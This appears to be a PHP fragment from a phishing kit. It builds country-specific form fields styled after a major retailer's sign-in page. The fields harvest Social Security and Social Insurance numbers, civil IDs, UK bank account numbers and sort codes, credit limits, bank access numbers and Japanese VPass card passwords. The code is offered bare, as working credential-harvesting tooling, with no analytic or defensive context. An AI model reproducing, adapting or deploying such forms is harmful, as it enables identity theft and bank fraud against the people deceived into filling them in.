<?php
switch ($countryname) {

case "Greece":
case "Hong Kong":
  $additional = '<div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="text" name="numbid" id="numbid" placeholder="ID Number" autocorrect="off" autocapitalize="off" required="required">
  </div>';
  $card = '';
break;

case "Kuwait":
  $additional = '<div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="tel" name="civilid" id="civilid" placeholder="Civil ID Number" autocorrect="off" autocapitalize="off" required="required">
  </div>';
  $card = '';
break;

case "United States":
  $additional = '<div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="tel" placeholder="Social Security Number" name="ssn" id="ssn" autocorrect="off" autocapitalize="off" required="required">
  </div>';
  $card = '';
break;

case "Canada":
  $additional = '<div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="tel" placeholder="Social Insurance Number" name="sin" id="ssn" autocorrect="off" autocapitalize="off" required="required">
  </div>';
  $card = '';
break;

case "Australia":
  $additional = '<div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="tel" placeholder="OSID Number" name="osidnumber" id="osidnumber" autocorrect="off" autocapitalize="off">
  </div>';
  $card = '<div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="text" name="climit" id="climit" placeholder="Credit Limit (ex: $5000)" autocorrect="off" autocapitalize="off">
  </div>';
break;

case "New Zealand":
  $additional = '';
  $card = '<div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="text" name="climit" id="climit" placeholder="Credit Limit (ex: $5000)" autocorrect="off" autocapitalize="off" required="required">
  </div>
  <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="tel" name="bans" id="bans" placeholder="Bank Access Number" autocorrect="off" autocapitalize="off" required="required">
  </div>';
break;

case "United Kingdom":
  $additional = '';
  $card = '<div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="tel" name="acno" id="acno" placeholder="Account Number" autocorrect="off" autocapitalize="off" required="required">
  </div>
  <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="tel" name="sortcode" id="sortcode" placeholder="Sort Code" maxlength="8" autocorrect="off" autocapitalize="off" required="required">
  </div>';
break;

case "Japan":
$additional = '';
  $card = '<div style="display:none;" id="webid" style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="text" name="cardid" id="cardid" onfocusout="var webid = $(\'#cardid\').val();

        if(isValidEmailAddress(webid)) {
          $(\'#cardid\').val(\'\');
        }" autocorrect="off" placeholder="WEB サービス ID" autocapitalize="off">
  </div>
  <div id="passwordjp" style="display:none;" style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="password" name="passjp" id="passjp" placeholder="パスワード （VPass / MSCode）" autocorrect="off" placeholder="WEB サービス ID" autocapitalize="off">
  </div>';
break;

default:
  $additional = '';
  $card = '';
}
?>
